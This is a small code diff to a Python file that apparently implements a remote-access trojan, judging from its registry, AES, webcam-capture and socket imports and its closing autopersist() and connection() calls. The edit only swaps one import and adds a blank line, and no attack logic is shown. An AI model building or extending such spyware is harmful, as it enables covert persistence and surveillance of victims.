@@ -9,7 +9,7 @@ import shutil
 from winreg import *
 import sys, subprocess, os
 import re
-from bottle import unicode
+from vodkalib import unicode
 from Crypto.Cipher import AES
 from cv2 import VideoCapture,imwrite
 from  os.path import isfile
@@ -1263,3 +1263,4 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 autopersist()
 connection()
+
